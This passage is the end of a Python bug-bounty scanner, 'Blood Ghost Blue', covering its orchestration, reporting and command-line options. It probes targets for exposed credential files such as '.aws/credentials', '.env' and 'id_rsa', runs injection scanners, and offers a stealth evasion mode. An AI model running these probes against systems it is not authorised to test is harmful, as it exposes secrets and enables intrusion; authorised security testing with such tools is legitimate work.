                        'severity': 'MEDIUM',
                        'param': param,
                        'payload': payload,
                        'evidence': f'Location: {location}',
                        'confidence': 90,
                        'method': 'redirect',
                        'waf': resp.get('waf'),
                        'validation_status': 'auto_verified',
                    }
        
        return None

# ═══════════════════════════════════════════════════════════════════════════════════════
# MAIN SCANNER — BLOOD GHOST BLUE DARK EDITION
# ═══════════════════════════════════════════════════════════════════════════════════════

class BloodGhostBlue:
    """Master scanner — orchestrates all modules."""
    
    def __init__(self, config: Config):
        self.config = config
        self.db = Database(config.db_path)
        self.fp = FalsePositiveEngine(config)
        self.recon = ReconEngine(config)
        self.scanners = VulnerabilityScanners()
        self.ghost = GhostModules()
        self.findings = []
        self.session_id = str(uuid.uuid4())[:8]
        self.start_time = None
        self.scan_stats = Counter()
    
    def banner(self):
        """Display the dark banner."""
        print(f"""
{RD}{BOLD}╔══════════════════════════════════════════════════════════════════════════════╗
{RD}║                                                                              ║
{RD}║  ██████╗ ██╗      ██████╗  ██████╗ ██████╗                                 ║
{RD}║  ██╔══██╗██║     ██╔═══██╗██╔═══██╗██╔══██╗                                ║
{RD}║  ██████╔╝██║     ██║   ██║██║   ██║██║  ██║                                ║
{RD}║  ██╔══██╗██║     ██║   ██║██║   ██║██║  ██║                                ║
{RD}║  ██████╔╝███████╗╚██████╔╝╚██████╔╝██████╔╝                                ║
{RD}║  ╚═════╝ ╚══════╝ ╚═════╝  ╚═════╝ ╚═════╝                                 ║
{RD}║                                                                              ║
{RD}║  ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗    ██████╗ ██╗     ██╗   ██╗███████╗{NC}
{RD}║  ██╔════╝ ██║  ██║██╔═══██╗██╔════╝╚══██╔══╝    ██╔══██╗██║     ██║   ██║██╔════╝{NC}
{RD}║  ██║  ███╗███████║██║   ██║███████╗   ██║       ██████╔╝██║     ██║   ██║█████╗  {NC}
{RD}║  ██║   ██║██╔══██║██║   ██║╚════██║   ██║       ██╔══██╗██║     ██║   ██║██╔══╝  {NC}
{RD}║  ╚██████╔╝██║  ██║╚██████╔╝███████║   ██║       ██████╔╝███████╗╚██████╔╝███████╗{NC}
{RD}║   ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝       ╚═════╝ ╚══════╝ ╚═════╝ ╚══════╝{NC}
{RD}║                                                                              ║
{RD}╚══════════════════════════════════════════════════════════════════════════════╝{NC}
{CY}{BOLD}                  🩸 BLOOD GHOST BLUE — DARK EDITION v4.0{NC}
{CY}                  Bug Bounty Hunter • Real Exploitation Engine{NC}
{CY}                  Author: {self.config.hunter_name}{NC}
{CY}                  Session: {self.session_id}{NC}
{CY}                  Targets: {', '.join(self.config.targets)}{NC}
{CY}                  Workers: {self.config.workers} | Rate: {self.config.rate_limit}/s{NC}
{CY}                  FP Filter: {GN if self.config.enable_fp_filter else RD}{'ENABLED' if self.config.enable_fp_filter else 'DISABLED'}{NC}
{CY}                  Mode: {YL if self.config.stealth_mode else GN}{'STEALTH' if self.config.stealth_mode else 'NORMAL'}{NC}
""")
    
    async def run(self):
        """Execute the complete bug bounty hunting cycle."""
        self.banner()
        self.start_time = datetime.now()
        
        for domain in self.config.targets:
            print(f"\n{RD}{'═'*70}{NC}")
            print(f"{RD}{BOLD}  🎯 TARGET: {YL}{domain}{NC}")
            print(f"{RD}{'═'*70}{NC}\n")
            
            # Phase 1: Reconnaissance
            print(f"{CY}[ PHASE 1: RECONNAISSANCE ]{NC}")
            async with SessionManager(self.config) as session:
                subdomains, urls = await self.recon.full_recon(domain, session, self.db)
                print(f"  {GN}Total: {len(subdomains)} subdomains, {len(urls)} URLs{NC}\n")
                
                # Phase 2: Sensitive File Scanning
                if self.config.scan_sensitive_files:
                    print(f"{CY}[ PHASE 2: SENSITIVE FILE SCAN ]{NC}")
                    sensitive_files = [
                        '.env', '.git/config', 'wp-config.php', 'backup.sql',
                        'phpinfo.php', 'debug.log', '.aws/credentials',
                        'docker-compose.yml', 'Dockerfile', 'id_rsa',
                    ]
                    found_files = 0
                    for subdomain in list(subdomains)[:50]:
                        for scheme in ['https://', 'http://']:
                            for path in sensitive_files[:20]:
                                file_url = f"{scheme}{subdomain}/{path}"
                                resp = await session.fetch(file_url)
                                if resp['status'] == 200 and resp['size'] > 50:
                                    finding = {
                                        'id': str(uuid.uuid4())[:12],
                                        'target': domain,
                                        'url': file_url,
                                        'vuln_type': 'Sensitive File Exposure',
                                        'severity': 'CRITICAL' if any(k in resp['text'].lower() for k in ['password', 'secret', 'key', 'token']) else 'HIGH',
                                        'param': path,
                                        'payload': '',
                                        'evidence': resp['text'][:300],
                                        'confidence': 98,
                                        'method': 'direct_access',
                                        'waf': resp.get('waf'),
                                        'validation_status': 'auto_verified',
                                    }
                                    self.db.save_finding(finding)
                                    self.findings.append(finding)
                                    found_files += 1
                                    print(f"  {RD}[!] {file_url}{NC}")
                    print(f"  {GN}Sensitive files found: {found_files}{NC}\n")
                
                # Phase 3: Vulnerability Scanning
                print(f"{CY}[ PHASE 3: VULNERABILITY SCANNING ]{NC}")
                
                in_scope_urls = [u for u in urls if in_scope(u, self.config)]
                in_scope_urls = list(set(in_scope_urls))[:self.config.max_urls]
                
                scanned = 0
                
                for i, url in enumerate(in_scope_urls):
                    if i % 50 == 0:
                        print(f"\r  {CY}[{i}/{len(in_scope_urls)}] Scanning...{NC}", end='', flush=True)
                    
                    parsed = urlparse(url)
                    params = list(parse_qs(parsed.query).keys()) if parsed.query else []
                    
                    if not params:
                        continue
                    
                    tasks = []
                    for param in params[:3]:
                        if self.config.scan_xss:
                            tasks.append(self.scanners.scan_xss(session, url, param, self.config, self.fp))
                        if self.config.scan_sqli:
                            tasks.append(self.scanners.scan_sqli(session, url, param, self.config, self.fp))
                        if self.config.scan_lfi:
                            tasks.append(self.scanners.scan_lfi(session, url, param, self.config, self.fp))
                        if self.config.scan_ssti:
                            tasks.append(self.scanners.scan_ssti(session, url, param, self.config, self.fp))
                        if self.config.scan_ssrf:
                            tasks.append(self.scanners.scan_ssrf(session, url, param, self.config))
                        if self.config.scan_cmdi:
                            tasks.append(self.scanners.scan_cmdi(session, url, param, self.config, self.fp))
                        if self.config.scan_redirect:
                            tasks.append(self.scanners.scan_redirect(session, url, param, self.config))
                    
                    if self.config.scan_idor:
                        tasks.append(self.scanners.scan_idor(session, url, self.config, self.fp))
                    if self.config.scan_cors:
                        tasks.append(self.scanners.scan_cors(session, url, self.config))
                    
                    results = await asyncio.gather(*tasks, return_exceptions=True)
                    
                    for result in results:
                        if isinstance(result, list):
                            for item in result:
                                if item:
                                    self.findings.append(item)
                                    self.db.save_finding(item)
                                    sev = item.get('severity', 'INFO')
                                    sev_color = RD if sev == 'CRITICAL' else YL if sev == 'HIGH' else CY
                                    print(f"\n  {sev_color}[{item.get('vuln_type','?')}] {item.get('url','')[:80]}{NC}")
                        elif result and not isinstance(result, Exception):
                            self.findings.append(result)
                            self.db.save_finding(result)
                            sev = result.get('severity', 'INFO')
                            sev_color = RD if sev == 'CRITICAL' else YL if sev == 'HIGH' else CY
                            print(f"\n  {sev_color}[{result.get('vuln_type','?')}] {result.get('url','')[:80]}{NC}")
                    
                    scanned += 1
                
                print(f"\r  {GN}[✓] Scanned {scanned} URLs{NC}      \n")
        
        # Phase 4: Summary
        self.summary()
        self.db.close()
    
    def summary(self):
        """Generate final report."""
        elapsed = (datetime.now() - self.start_time).total_seconds() if self.start_time else 0
        stats = self.db.get_stats()
        fp_stats = self.fp.get_stats()
        
        print(f"\n{RD}{'═'*70}{NC}")
        print(f"{RD}{BOLD}[ HUNT SUMMARY ]{NC}")
        print(f"{RD}{'═'*70}{NC}")
        print(f"  {GN}Duration: {elapsed:.1f}s{NC}")
        print(f"  {GN}Total Findings: {stats['total']}{NC}")
        print(f"  {RD}Critical: {stats['critical']}{NC}")
        print(f"  {YL}High: {stats['high']}{NC}")
        print(f"  {CY}Medium: {stats['medium']}{NC}")
        print(f"  {WT}Low: {stats['low']}{NC}")
        print(f"  {GN}Verified: {stats['verified']}{NC}")
        print(f"  {YL}False Positives Eliminated: {fp_stats['total_filtered']}{NC}")
        
        if self.findings:
            print(f"\n  {RD}{BOLD}Top Findings:{NC}")
            sorted_findings = sorted(self.findings, key=lambda x: (x.get('severity') == 'CRITICAL', x.get('confidence', 0)), reverse=True)
            for f in sorted_findings[:10]:
                sev = f.get('severity', '?')
                sev_color = RD if sev == 'CRITICAL' else YL if sev == 'HIGH' else CY
                print(f"  {sev_color}[{sev}] {f.get('vuln_type','?')} — {f.get('url','')[:60]}{NC}")
        
        # Export reports
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        output_dir = Path(self.config.output_dir)
        
        # JSON
        json_path = output_dir / f"bounty_report_{timestamp}.json"
        json_path.write_text(json.dumps({
            'tool': 'Blood Ghost Blue v4.0 Dark Edition',
            'hunter': self.config.hunter_name,
            'targets': self.config.targets,
            'session_id': self.session_id,
            'duration': elapsed,
            'stats': stats,
            'fp_stats': fp_stats,
            'findings': self.findings
        }, indent=2, default=str))
        
        # CSV
        csv_path = output_dir / f"bounty_report_{timestamp}.csv"
        with open(csv_path, 'w', newline='') as f:
            writer = csv.writer(f)
            writer.writerow(['URL', 'Type', 'Severity', 'Parameter', 'Payload', 'Confidence', 'WAF', 'Validated'])
            for finding in self.findings:
                writer.writerow([
                    finding.get('url', ''),
                    finding.get('vuln_type', ''),
                    finding.get('severity', ''),
                    finding.get('param', ''),
                    finding.get('payload', ''),
                    finding.get('confidence', 0),
                    finding.get('waf', ''),
                    finding.get('validation_status', '')
                ])
        
        # Markdown
        md_path = output_dir / f"bounty_report_{timestamp}.md"
        md_content = f"""# 🩸 Blood Ghost Blue — Bug Bounty Report

## Summary
- **Hunter:** {self.config.hunter_name}
- **Targets:** {', '.join(self.config.targets)}
- **Duration:** {elapsed:.1f}s
- **Total Findings:** {stats['total']}
- **Critical:** {stats['critical']}
- **High:** {stats['high']}
- **Medium:** {stats['medium']}
- **Low:** {stats['low']}
- **False Positives Eliminated:** {fp_stats['total_filtered']}

## Top Findings

| Severity | Type | URL |
|----------|------|-----|
"""
        for f in sorted(self.findings, key=lambda x: (x.get('severity') == 'CRITICAL', x.get('confidence', 0)), reverse=True)[:20]:
            md_content += f"| {f.get('severity','?')} | {f.get('vuln_type','?')} | {f.get('url','')[:80]} |\n"
        
        md_path.write_text(md_content)
        
        print(f"\n  {GN}Reports Generated:{NC}")
        print(f"  {GN}  📄 JSON: {json_path}{NC}")
        print(f"  {GN}  📊 CSV:  {csv_path}{NC}")
        print(f"  {GN}  📝 MD:   {md_path}{NC}")
        print(f"\n{RD}{'═'*70}{NC}")
        print(f"{RD}{BOLD}[ HUNT COMPLETE ]{NC}")
        print(f"{RD}{'═'*70}{NC}\n")

# ═══════════════════════════════════════════════════════════════════════════════════════
# MAIN ENTRY POINT
# ═══════════════════════════════════════════════════════════════════════════════════════

async def main():
    """Main entry point."""
    if len(sys.argv) < 2:
        print(f"""
{RD}{BOLD}🩸 BLOOD GHOST BLUE — DARK EDITION v4.0{NC}

{YL}Usage:{NC}
  python3 {sys.argv[0]} <target> [OPTIONS]

{YL}Target:{NC}
  domain.com              Single domain
  domain.com,domain2.com  Multiple domains

{YL}Options:{NC}
  --scope <domains>          Comma-separated scope (e.g., *.target.com,api.target.com)
  --out <domains>            Comma-separated out-of-scope
  --fp-mode <mode>           False positive aggression: lenient|normal|aggressive
  --threads <N>              Concurrent workers (default: 5)
  --rate <N>                 Requests/second (default: 2.0)
  --output <dir>             Output directory (default: ./bounty_results)
  --stealth                  Ultra-slow evasion mode
  --deep                     Full recon + all modules
  --payloads <N>             Number of payloads per type (default: 30)

{YL}Examples:{NC}
  python3 {sys.argv[0]} target.com
  python3 {sys.argv[0]} target.com --fp-mode aggressive --deep
  python3 {sys.argv[0]} target.com --scope '*.target.com' --threads 10
  python3 {sys.argv[0]} target.com --stealth --rate 5.0
        """)
        sys.exit(1)
    
    # Parse targets
    targets_raw = sys.argv[1]
    targets = [t.strip() for t in targets_raw.split(',')]
    
    # Parse options
    scope = []
    out_of_scope = []
    fp_aggression = 2
    workers = 5
    rate_limit = 2.0
    output_dir = "./bounty_results"
    stealth = False
    deep_mode = False
    xss_count = 30
    sqli_count = 20
    
    i = 2
    while i < len(sys.argv):
        arg = sys.argv[i]
        if arg == '--scope' and i + 1 < len(sys.argv):
            scope = [s.strip() for s in sys.argv[i + 1].split(',')]
            i += 2
        elif arg == '--out' and i + 1 < len(sys.argv):
            out_of_scope = [s.strip() for s in sys.argv[i + 1].split(',')]
            i += 2
        elif arg == '--fp-mode' and i + 1 < len(sys.argv):
            mode = sys.argv[i + 1].lower()
            fp_aggression = {'lenient': 1, 'normal': 2, 'aggressive': 3}.get(mode, 2)
            i += 2
        elif arg == '--threads' and i + 1 < len(sys.argv):
            workers = int(sys.argv[i + 1])
            i += 2
        elif arg == '--rate' and i + 1 < len(sys.argv):
            rate_limit = float(sys.argv[i + 1])
            i += 2
        elif arg == '--output' and i + 1 < len(sys.argv):
            output_dir = sys.argv[i + 1]
            i += 2
        elif arg == '--stealth':
            stealth = True
            i += 1
        elif arg == '--deep':
            deep_mode = True
            i += 1
        elif arg == '--payloads' and i + 1 < len(sys.argv):
            val = int(sys.argv[i + 1])
            xss_count = val
            sqli_count = max(10, val // 2)
            i += 2
        else:
            i += 1
    
    if deep_mode:
        workers = min(10, workers * 2)
        xss_count = 50
        sqli_count = 30
    
    if stealth:
        workers = 1
        rate_limit = max(3.0, rate_limit)
    
    config = Config(
        targets=targets,
        scope_domains=scope if scope else [f"*.{t}" for t in targets] + targets,
        out_of_scope=out_of_scope,
        workers=workers,
        rate_limit=rate_limit,
        output_dir=output_dir,
        fp_aggression=fp_aggression,
        stealth_mode=stealth,
        xss_payload_count=xss_count,
        sqli_payload_count=sqli_count,
        hunter_name=os.environ.get('BOUNTY_HUNTER', '418teapot'),
        hunter_email=os.environ.get('BOUNTY_EMAIL', '418teapotbot@gmail.com'),
    )
    
    print(f"{CY}[*] Initializing Blood Ghost Blue Dark Edition...{NC}")
    print(f"{CY}[*] Targets: {', '.join(targets)}{NC}")
    print(f"{CY}[*] Workers: {config.workers} | Rate: {config.rate_limit}/s{NC}")
    
    scanner = BloodGhostBlue(config)
    await scanner.run()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n{YL}[!] Hunt interrupted by hunter{NC}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{RD}[!] Fatal Error: {e}{NC}")
        traceback.print_exc()
        sys.exit(1)
